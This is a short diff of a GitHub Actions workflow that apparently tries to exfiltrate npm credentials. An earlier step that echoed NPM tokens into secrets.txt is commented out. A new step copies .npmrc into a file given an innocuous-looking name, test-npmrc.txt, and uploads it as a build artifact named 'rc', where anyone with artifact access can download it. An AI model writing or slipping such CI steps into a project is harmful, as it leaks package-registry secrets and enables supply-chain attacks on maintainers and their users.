@@ -42,13 +42,13 @@ jobs:
         with:
           main-branch-name: ${{ github.base_ref }}
 
-      - name: Set up secret file
-        env:
-          NPM_BB_TOKEN: ${{ secrets.NPM_BB_TOKEN }}
-          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
-        run: |
-          echo $NPM_BB_TOKEN >> secrets.txt
-          echo $NPM_TOKEN >> secrets.txt
+      # - name: Set up secret file
+      #   env:
+      #     NPM_BB_TOKEN: ${{ secrets.NPM_BB_TOKEN }}
+      #     NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+      #   run: |
+      #     echo $NPM_BB_TOKEN >> secrets.txt
+      #     echo $NPM_TOKEN >> secrets.txt
 
       # - name: Upload ex
       #   uses: actions/upload-artifact@v4
@@ -56,12 +56,16 @@ jobs:
       #     name: sec
       #     path: secrets.txt
       
-      
+      - name: Copy and rename file
+        run: |
+          mkdir -p ./to
+          cp ./.npmrc ./to/test-npmrc.txt
+            
       - name: Upload rc
         uses: actions/upload-artifact@v4
         with:
           name: rc
-          path: .npmrc
+          path: ./to/test-npmrc.txt
 
       - name: Setup Node.js
         uses: ./.github/actions/node-step
